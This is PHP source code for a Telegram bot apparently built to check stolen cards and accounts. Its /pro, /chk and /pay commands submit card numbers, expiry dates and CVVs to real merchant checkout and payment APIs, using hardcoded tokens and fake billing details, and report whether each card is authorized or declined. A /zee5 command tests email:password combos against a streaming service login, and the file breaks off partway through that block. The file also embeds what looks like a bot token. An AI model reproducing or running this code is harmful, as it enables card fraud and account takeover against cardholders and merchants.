<?php

////////////////=============[Zeltrax Bot Raw]=============////////////////
////////==========[Join @TechSoham and @ZeltraxChat for more]==========////////

$botToken = "1570963168:AAG2lhMG_me3B6i9643wYMKHRhyzxFHrRJ0"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0AJoin My Master Channel: @techhacksbysoham%0ABot Made by:  @TechSoham</b>", $message_id);
}

//////////=========[Cmds Command]=========//////////


elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<b>╭───────────────────────────╮</b>%0A<b>├ Bin lookup:</b> <code>/bin</code>%0A├%0A<b>├ Private CC Checker :</b> <code>/pro</code>%0A├%0A<b>├ Info:</b> <code>/info</code> To know ur info%0A├%0A<b>├ Bot Made by:  @TechSoham</b>%0A<b>╰───────────────────────────╯</b>", $message_id);
}

//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<b>╭───────────────────────────╮</b>%0A<b> ├ ID:</b> <code>$userId</code>%0A%0A<b> ├ Name:</b> $firstname%0A%0A<b> ├ Username:</b> @$username%0A%0A<b> ├ Bot Made by:  @TechSoham</b>%0A<b>╰───────────────────────────╯</b>", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');



if($type != null){
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by:  @TechSoham</b>', $message_id);
}
else{
sendMessage($chatId, '<b>❌ Invalid Bin</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by:  @TechSoham</b>', $message_id);
};
}


elseif(strpos($message, "/pro") === 0){
$lista = substr($message, 5);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$firstname = 'Markoie';
$lastname = 'Alexsona';
$country1 = 'US';
$city = 'Kalamazoo';
$zip = '49006';
$state = 'Michigan';
$email = 'sfehifie@openitbox.com';
$phone = '4583962142';

$scheme13 = strtoupper($scheme);
$type13 = strtoupper($type);
$name13 = strtoupper($name);
$bank13 = strtoupper($bank);
$brand13 = strtoupper($brand);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MTQ2ODU0NDgsImp0aSI6ImZmYzBlOWExLWE5OTQtNDQ1OS05MmI5LTlhMDRmZDNhMjFiOCIsInN1YiI6Ing5ZDZnY3BzNjdxbTkycTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ing5ZDZnY3BzNjdxbTkycTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoidmljY29DQUQifX0.UckEQyAjzObaGwnKBFNZx4Q4uLZbJLkKUqmgVZSMG6GyFvSn27NIVaZSHvOM1YvJXIrTwbgB84p78-O7MWom2Q',
'Braintree-Version: 2018-05-10',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: payments.braintree-api.com',
'Origin: https://assets.braintreegateway.com',
'Referer: https://assets.braintreegateway.com/',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: cross-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e70b3c2c-4086-47ee-8744-8701344d62e1"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"'.$firstname.'","billingAddress":{"countryName":"United States","postalCode":"'.$zip.'","streetAddress":"Street 104, Street 104 Street 154"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$result1665 = curl_exec($ch);
$token = trim(strip_tags(getstr($result1665,'"token":"','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.bigcommerce.com/api/public/v1/orders/payments');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json',
'Accept-Language: en-US,en;q=0.9',
'Authorization: JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTQ2MDI4OTQsIm5iZiI6MTYxNDU5OTI5NCwiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDAwMzgxNjAxLCJqdGkiOiJhZDM2Y2NlZC0xM2VhLTRjZDgtYTQxYy01MTI4M2ZhMzcxY2EiLCJpYXQiOjE2MTQ1OTkyOTQsImRhdGEiOnsic3RvcmVfaWQiOiIxMDAwMzgxNjAxIiwib3JkZXJfaWQiOiIxODAxIiwiYW1vdW50IjoyNTAwLCJjdXJyZW5jeSI6IkNBRCIsInN0b3JlX3VybCI6Imh0dHBzOi8vdmljY29zaG9wLmNhIiwiZm9ybV9pZCI6bnVsbH19.QJQ85sEFh0YOLIc8nc5MT2Pyl4uTELhPNS5j28aaaA4',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: payments.bigcommerce.com',
'Origin: https://viccoshop.ca',
'Referer: https://viccoshop.ca/',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: cross-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"customer":{"geo_ip_country_code":"IN","id":"1018","session_token":"3ad95ac45088d9e8cb08bee5da63e1f36bd12f02"},"notify_url":"https://internalapi-1000381601.mybigcommerce.com/internalapi/v1/checkout/order/1801/payment","order":{"billing_address":{"city":"'.$city.'","company":"jeigjw","country_code":"US","country":"United States","first_name":"'.$firstname.'","last_name":"'.$lastname.'","phone":"'.$phone.'","state_code":"'.$state.'","state":"'.$city.'","street_1":"Street 104, Street 104","street_2":"Street 154","zip":"49006","email":"'.$firstname.'yyi@openitbox.com"},"coupons":[],"currency":"CAD","id":"1801","items":[{"code":"e2c81d69-22ea-4ad7-bf6e-3c7e81e52fec","name":"CA$25.00 Gift Certificate","price":2500,"unit_price":2500,"quantity":1}],"shipping":[],"shipping_address":{},"token":"3d2d7f847cac4c80bd025cd2747639ac","totals":{"grand_total":2500,"handling":0,"shipping":0,"subtotal":2500,"tax":0}},"payment":{"device_info":"{\"device_session_id\":\"18e60b2e3ad70b4eedcd21bb84a1009e\",\"fraud_merchant_id\":null,\"correlation_id\":\"99a6292b7319b8438cb908a939d0e9a1\"}","gateway":"braintree","notify_url":"https://internalapi-1000381601.mybigcommerce.com/internalapi/v1/checkout/order/1801/payment","vault_payment_instrument":false,"method":"credit-card","credit_card_token":{"token":"'.$token.'"}},"store":{"hash":"htymzqignw","id":"1000381601","name":"Vicco"}}');

$result = curl_exec($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result, '"status":"success"')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD AUTHORIZED 🟢🟢</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Invalid card verification number')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CCN MATCHED</b>%0A</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Expired card')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD EXPIRED 🔴🔴</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "pickup_card")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CVV MATCHED 🟢🟢</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "invalid_number")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD NUMBER INCORRECT 🔴🔴</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "transaction_declined")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD DECLINED 🔴🔴</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "unsupported_request")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD DOESNT SUPPORT THIS PURCHASE 🔴🔴</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b><b>Error Not listed ⚠⚠</b>%0A<b>Bank:</b> $bank13%0A<b>Country:</b> $name13%0A<b>Brand:</b> $brand13%0A<b>Card:</b> $scheme13%0A<b>Type:</b> $type13%0A<b>Auth:</b> Private Gateway%0A%<b>Checked By:</b> @$username%0A<0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}

elseif(strpos($message, "/chk") === 0){
$lista = substr($message, 5);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$firstname = 'Markoie';
$lastname = 'Alexsona';
$country1 = 'US';
$city = 'Kalamazoo';
$zip = '49006';
$state = 'Michigan';
$email = 'sfehifie@openitbox.com';

$scheme12 = strtoupper($scheme);
$type12 = strtoupper($type);
$name12 = strtoupper($name);
$bank12 = strtoupper($bank);
$brand12 = strtoupper($brand);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://layprivacypoliciescontextual.onfastspring.com/popup-layprivacypoliciescontextual/session/nG6t1S5RTiOffA3qEZWNGA/payment');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: layprivacypoliciescontextual.onfastspring.com',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json;charset=UTF-8',
'origin: https://layprivacypoliciescontextual.onfastspring.com',
'referer: https://layprivacypoliciescontextual.onfastspring.com/popup-layprivacypoliciescontextual/session/nG6t1S5RTiOffA3qEZWNGA',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"contact":{"email":"'.$firstname.'cyyi@openitbox.com","country":"'.$country1.'","firstName":"'.$firstname.'","lastName":"'.$lastname.'","company":"werkjfkrwo","postalCode":"10010","phoneNumber":"'.$phone.'"},"card":{"year":"'.$ano.'","month":"'.$mes.'","number":"'.$cc.'","security":"'.$cvv.'"},"paymentType":"card","subscribe":true,"recipientSelected":false}');

$result = curl_exec($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result, '"type":"success"')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD AUTHORIZED 🟢🟢</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway [Charge : 12$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "card.security")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CCN MATCHED 🟠🟠</b>%0A</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway [Charge : 12$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "card.year")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD EXPIRED 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway [Charge : 12$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "card.number")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD NUMBER INCORRECT 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway [Charge : 12$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "CardDeclined")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD DECLINED 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway [Charge : 12$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "FailureRisk")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>FAILURE RISK 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway [Charge : 12$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Maintain!!</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}


elseif(strpos($message, "/pay") === 0){
$lista = substr($message, 5);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$firstname = 'Markoie';
$lastname = 'Alexsona';
$country1 = 'US';
$email = 'dsuu87w8u@openitbox.com';
$city = 'Kalamazoo';
$zip = '49006';
$state = 'Michigan';
$email = 'sfehifie@openitbox.com';

$scheme12 = strtoupper($scheme);
$type12 = strtoupper($type);
$name12 = strtoupper($name);
$bank12 = strtoupper($bank);
$brand12 = strtoupper($brand);
$ectoken = ('EC-55U21740LT7892337');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.joompay.tech/1.1/orderGroups/603b9bc3dd4d4937088714a8/token/payNewCard');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.joompay.tech',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'authorization: Token 43QoKiW3Oeem3H4klgbaCbYH',
'content-type: text/plain;charset=UTF-8',
'origin: https://d2jdr66h93kmjq.cloudfront.net',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"cardData":{"cardNumber":"'.$cc.'","expirationYear":'.$ano.',"expirationMonth":'.$mes.',"cvn":"'.$cvv.'"},"doNotRememberCard":false,"tmxSessionId":"e0cc219d-2883-49f5-ab5c-ff9a792afbd6","profilingId":"603b9bbfdd4d490008864cf7","authChallengeSuccessUrl":"https://www.joom.com/iframe-payment/session-603b9bbddd4d4900088608ef/success","authChallengeFailureUrl":"https://www.joom.com/iframe-payment/session-603b9bbddd4d4900088608ef/failure"}');

$result = curl_exec($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result, "success")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD AUTHORIZED 🟢🟢</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway  2  [Charge : 5$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "Validity period expired")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD EXPIRED 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway  2  [Charge : 5$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "Invalid card number")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD NUMBER INCORRECT 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway  2  [Charge : 5$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, "payments.decline")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD DECLINED 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway  2  [Charge : 5$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'The card type is not accepted by the payment processor')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD DOESNT SUPPORT THIS PURCHASE 🔴🔴</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway  2 [Charge : 5$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b><b> Proxy Error/Error Not Listed ⚠⚠</b>%0A<b>Bank:</b> $bank12%0A<b>Country:</b> $name12%0A<b>Brand:</b> $brand12%0A<b>Card:</b> $scheme12%0A<b>Type:</b> $type12%0A<b>Auth:</b> Private Gateway  2 [Charge : 5$]%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}




//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////===========[Login Check]============/////////////////////

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

/////////////////===============[Result]===========///////////////////

if($token){
